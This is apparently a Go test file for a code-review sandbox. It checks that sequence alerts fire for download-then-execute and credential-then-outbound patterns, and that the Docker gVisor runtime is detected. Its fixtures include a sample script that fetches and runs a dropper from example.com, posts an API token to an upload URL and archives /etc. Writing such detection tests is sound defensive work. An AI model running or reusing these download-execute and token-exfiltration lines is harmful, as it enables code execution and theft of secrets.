package sandbox

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRunnerBuildsBehaviorTimelineAndSequenceAlerts(t *testing.T) {
	t.Setenv("REVIEW_SANDBOX_EXEC_MODE", "local")

	dir := t.TempDir()
	script := `#!/bin/bash
curl http://example.com/dropper.sh -o /tmp/a.sh
chmod +x /tmp/a.sh
exec.Command("/bin/sh", "-c", "/tmp/a.sh")
token = os.getenv("API_TOKEN")
requests.post("http://example.com/upload", token)
tar -czf /tmp/data.tgz /etc
ssh user@10.0.0.2
/api/checkin
`
	if err := os.WriteFile(filepath.Join(dir, "malicious.sh"), []byte(script), 0644); err != nil {
		t.Fatalf("write sample failed: %v", err)
	}

	r := NewRunner()
	profile, _, err := r.Execute(dir, ExecuteOptions{})
	if err != nil {
		t.Fatalf("execute failed: %v", err)
	}

	if len(profile.BehaviorTimelines) == 0 {
		t.Fatalf("expected behavior timelines, got none")
	}
	if len(profile.SequenceAlerts) == 0 {
		t.Fatalf("expected sequence alerts, got none")
	}

	if !contains(profile.SequenceAlerts, "命中下载后执行时序") {
		t.Fatalf("expected download->execute alert, got: %v", profile.SequenceAlerts)
	}
	if !contains(profile.SequenceAlerts, "命中凭据访问后外联时序") {
		t.Fatalf("expected credential->outbound alert, got alerts=%v timelines=%v", profile.SequenceAlerts, profile.BehaviorTimelines)
	}
	if len(profile.C2BeaconIOCs) == 0 {
		t.Fatalf("expected c2 beacon iocs, got none")
	}
}

func TestBuildSequenceAlertsRequiresOrderedTimeline(t *testing.T) {
	segments := []*behaviorChainStat{
		{
			Source:            "sample.sh",
			RangeStart:        10,
			RangeEnd:          12,
			CategoryFirstLine: map[string]int{"执行": 10, "下载": 11},
			CategoryLastLine:  map[string]int{"执行": 10, "下载": 11},
		},
		{
			Source:            "sample.sh",
			RangeStart:        20,
			RangeEnd:          22,
			CategoryFirstLine: map[string]int{"外联": 20, "凭据访问": 21},
			CategoryLastLine:  map[string]int{"外联": 20, "凭据访问": 21},
		},
		{
			Source:            "sample.sh",
			RangeStart:        30,
			RangeEnd:          32,
			CategoryFirstLine: map[string]int{"下载": 30, "执行": 31},
			CategoryLastLine:  map[string]int{"下载": 30, "执行": 31},
		},
	}

	alerts := buildSequenceAlerts(segments)
	if !contains(alerts, "命中下载后执行时序") {
		t.Fatalf("expected ordered download->execute alert, got: %v", alerts)
	}
	if contains(alerts, "命中凭据访问后外联时序") {
		t.Fatalf("expected reversed credential/outbound sequence not to alert, got: %v", alerts)
	}
}

func TestRunnerDetectsFetchAndLongLineOutboundEvidence(t *testing.T) {
	t.Setenv("REVIEW_SANDBOX_EXEC_MODE", "local")

	dir := t.TempDir()
	longPrefix := strings.Repeat("a", 70*1024)
	script := longPrefix + `;fetch(API_BASE + "/upload", {method: "POST"})`
	if err := os.WriteFile(filepath.Join(dir, "client.js"), []byte(script), 0644); err != nil {
		t.Fatalf("write sample failed: %v", err)
	}

	profile, _, err := NewRunner().Execute(dir, ExecuteOptions{})
	if err != nil {
		t.Fatalf("execute failed: %v", err)
	}
	if len(profile.OutboundIOCs) == 0 {
		t.Fatalf("expected fetch outbound evidence, got none")
	}
}

func TestRunnerIgnoresDocsAndCommentsForDynamicEvidence(t *testing.T) {
	t.Setenv("REVIEW_SANDBOX_EXEC_MODE", "local")

	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "docs"), 0755); err != nil {
		t.Fatalf("mkdir docs failed: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "docs", "guide.md"), []byte("curl https://example.com/evil.sh\nauthorization: bearer token"), 0644); err != nil {
		t.Fatalf("write docs failed: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "client.py"), []byte("# requests.post('https://example.com/upload', token)\n# authorization: bearer token\nprint('safe')\n"), 0644); err != nil {
		t.Fatalf("write script failed: %v", err)
	}

	profile, _, err := NewRunner().Execute(dir, ExecuteOptions{})
	if err != nil {
		t.Fatalf("execute failed: %v", err)
	}
	if len(profile.OutboundIOCs) != 0 || len(profile.CredentialIOCs) != 0 {
		t.Fatalf("expected docs/comments not to create dynamic evidence, got outbound=%+v credential=%+v", profile.OutboundIOCs, profile.CredentialIOCs)
	}
}

func contains(items []string, target string) bool {
	for _, item := range items {
		if item == target {
			return true
		}
	}
	return false
}

func TestResolveDockerRuntimeDetectsRegisteredRunsc(t *testing.T) {
	t.Setenv("REVIEW_SANDBOX_DOCKER_RUNTIME", "")
	original := dockerInfoFormatRunner
	dockerInfoFormatRunner = func(format string) string {
		if strings.Contains(format, "DefaultRuntime") {
			return "runc\n"
		}
		return "runc\nrunsc\n"
	}
	defer func() { dockerInfoFormatRunner = original }()

	runtime, err := resolveDockerRuntime("gvisor")
	if err != nil {
		t.Fatalf("expected runtime resolved, got %v", err)
	}
	if runtime.Name != "runsc" {
		t.Fatalf("expected runsc runtime, got %+v", runtime)
	}
}

func TestResolveDockerRuntimeFailsWhenRunscNotRegistered(t *testing.T) {
	t.Setenv("REVIEW_SANDBOX_DOCKER_RUNTIME", "")
	original := dockerInfoFormatRunner
	dockerInfoFormatRunner = func(format string) string {
		if strings.Contains(format, "DefaultRuntime") {
			return "runc\n"
		}
		return "io.containerd.runc.v2\nrunc\n"
	}
	defer func() { dockerInfoFormatRunner = original }()

	_, err := resolveDockerRuntime("gvisor")
	if err == nil || !strings.Contains(err.Error(), "未注册 runsc/gvisor runtime") {
		t.Fatalf("expected missing Docker runtime error, got %v", err)
	}
}
